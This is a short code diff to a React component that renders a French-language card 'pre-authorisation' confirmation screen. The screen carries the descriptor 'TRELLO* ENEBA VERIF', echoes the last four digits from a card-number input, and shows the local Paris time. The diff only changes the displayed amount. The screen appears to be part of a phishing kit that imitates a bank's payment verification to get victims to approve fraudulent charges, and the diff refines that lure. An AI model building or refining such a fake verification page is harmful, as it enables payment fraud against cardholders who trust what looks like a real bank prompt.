@@ -309,7 +309,7 @@ const Board = () => {
               <>
                 <p>Confirmez la pré-autorisaton</p>
                 <span>TRELLO* ENEBA VERIF</span>
-                <span>Montant : 202,68€</span>
+                <span>Montant : 199,75€</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                 <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
